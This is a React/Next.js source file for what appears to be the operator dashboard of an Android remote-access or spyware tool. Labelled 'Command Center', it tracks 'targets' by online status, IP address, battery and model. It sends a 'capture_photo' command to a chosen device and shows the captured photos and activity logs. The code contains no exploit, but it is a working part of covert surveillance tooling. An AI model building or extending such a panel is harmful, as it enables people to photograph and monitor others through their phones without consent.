'use client';

import { useEffect, useMemo, useState } from 'react';
import dynamic from 'next/dynamic';
import { subscribeToTargets, sendCommand } from '@/services/targetService';
import { Target } from '@/types/target';
import { Device } from '@/types';
import { Shield, Wifi, WifiOff, Users, Activity } from 'lucide-react';

// Lazy load heavy components
const TargetList = dynamic(() => import('@/components/TargetList'), {
  loading: () => <div className="h-[400px] rounded-2xl bg-white/[0.02] animate-pulse border border-white/[0.06]" />,
});
const PhotoGallery = dynamic(() => import('@/components/PhotoGallery'), {
  loading: () => <div className="h-[400px] rounded-2xl bg-white/[0.02] animate-pulse border border-white/[0.06]" />,
});
const ActivityLog = dynamic(() => import('@/components/ActivityLog'), {
  loading: () => <div className="h-[400px] rounded-2xl bg-white/[0.02] animate-pulse border border-white/[0.06]" />,
});
const KillSwitch = dynamic(() => import('@/components/dashboard/KillSwitch').then(mod => mod.KillSwitch), {
  ssr: false,
});


export default function DashboardPage() {
  const [targets, setTargets] = useState<Target[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedTargetId, setSelectedTargetId] = useState<string | null>(null);
  const [busyTargetId, setBusyTargetId] = useState<string | null>(null);

  useEffect(() => {
    const unsubscribe = subscribeToTargets((incomingTargets: Target[] = []) => {
      setTargets(incomingTargets);
      setLoading(false);
    });

    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (!selectedTargetId && targets.length > 0) {
      setSelectedTargetId(targets[0].id);
    }
  }, [targets, selectedTargetId]);

  const selectedTarget = useMemo(
    () => targets.find((target) => target.id === selectedTargetId) ?? targets[0] ?? null,
    [selectedTargetId, targets]
  );

  const handleCapture = async (deviceId: string) => {
    setBusyTargetId(deviceId);
    try {
      await sendCommand(deviceId, 'capture_photo');
    } finally {
      setBusyTargetId(null);
    }
  };

  const onlineCount = useMemo(
    () => targets.filter((target) => target.status?.toUpperCase() === 'ONLINE').length,
    [targets]
  );

  const offlineCount = useMemo(() => targets.length - onlineCount, [targets.length, onlineCount]);

  // Convert Target to Device type for KillSwitch
  const devicesForKillSwitch = useMemo(() => {
    return targets.map(t => ({
      id: t.id,
      model: t.deviceInfo?.model || 'Unknown',
      status: (t.status?.toLowerCase() || 'offline') as any,
      battery: t.battery || 0,
      android_version: t.deviceInfo?.os || 'N/A',
      ip_address: t.ip || '0.0.0.0',
      last_ping: t.last_ping || 0
    })) as Device[];
  }, [targets]);

  return (
    <div className="space-y-8 animate-fade-in-up">
      {/* ── Header Section ── */}
      <section className="relative overflow-hidden hybrid-card p-6 lg:p-10">
        {/* Subtle hacker glow background */}
        <div className="absolute top-0 right-0 w-full h-full bg-[radial-gradient(circle_at_80%_20%,rgba(16,185,129,0.05),transparent_50%)] pointer-events-none" />
        
        <div className="relative flex flex-col lg:flex-row justify-between items-start gap-8">
          <div className="space-y-4">
            <div className="flex items-center gap-3">
              <div className="flex items-center gap-2 px-2.5 py-1 rounded-md bg-emerald-500/10 border border-emerald-500/20 accent-glow">
                <Activity size={12} className="text-emerald-400" />
                <span className="text-[10px] font-bold text-emerald-400 uppercase tracking-[0.2em] font-mono">System Live</span>
              </div>
            </div>
            <h1 className="text-4xl lg:text-5xl font-bold text-[#f7f8f8] tracking-[-0.04em]">
              Command Center
            </h1>
            <p className="max-w-xl text-[15px] text-[#8a8f98] leading-relaxed">
              Real-time monitoring for Android target devices. Refined dashboard for system status, captures, and activity logs.
            </p>
          </div>
          <div className="w-full lg:w-auto shrink-0">
            <KillSwitch devices={devicesForKillSwitch} />
          </div>
        </div>

        {/* ── Stat Cards ── */}
        <div className="relative mt-10 grid gap-4 sm:grid-cols-3">
          <StatCard
            icon={<Users size={18} />}
            label="Total Targets"
            value={targets.length}
            color="slate"
          />
          <StatCard
            icon={<Wifi size={18} />}
            label="Online Status"
            value={onlineCount}
            color="emerald"
          />
          <StatCard
            icon={<WifiOff size={18} />}
            label="Disconnected"
            value={offlineCount}
            color="red"
          />
        </div>
      </section>

      {/* ── 3-Column Content Grid ── */}
      <div className="grid gap-8 xl:grid-cols-[2.2fr_1.4fr_1fr]">
        <TargetList
          targets={targets}
          loading={loading}
          selectedTargetId={selectedTargetId ?? undefined}
          onSelect={(deviceId) => setSelectedTargetId(deviceId)}
          onCapture={handleCapture}
          busyTargetId={busyTargetId}
        />

        <PhotoGallery 
          targetId={selectedTarget?.id} 
          targets={targets}
          onTargetChange={(deviceId) => setSelectedTargetId(deviceId)}
        />

        <ActivityLog targetId={selectedTarget?.id} />
      </div>
    </div>
  );
}

/* ── Inline Stat Card ── */
function StatCard({
  icon,
  label,
  value,
  color,
}: {
  icon: React.ReactNode;
  label: string;
  value: number;
  color: 'slate' | 'emerald' | 'red';
}) {
  const colorMap = {
    slate: {
      iconBg: 'bg-slate-500/10',
      iconText: 'text-slate-400',
      value: 'text-white',
    },
    emerald: {
      iconBg: 'bg-emerald-500/10',
      iconText: 'text-emerald-400',
      value: 'text-emerald-400',
    },
    red: {
      iconBg: 'bg-red-500/10',
      iconText: 'text-red-400',
      value: 'text-red-400',
    },
  };

  const c = colorMap[color];

  return (
    <div className="flex items-center gap-5 hybrid-card p-5 group hover:bg-[#141516]">
      <div className={`flex items-center justify-center w-12 h-12 rounded-lg ${c.iconBg} transition-transform group-hover:scale-110`}>
        <span className={c.iconText}>{icon}</span>
      </div>
      <div>
        <p className="text-[10px] uppercase tracking-[0.15em] text-[#8a8f98] font-bold font-mono">{label}</p>
        <p className={`text-2xl font-bold ${c.value} mt-0.5 tracking-tighter`}>{value}</p>
      </div>
    </div>
  );
}
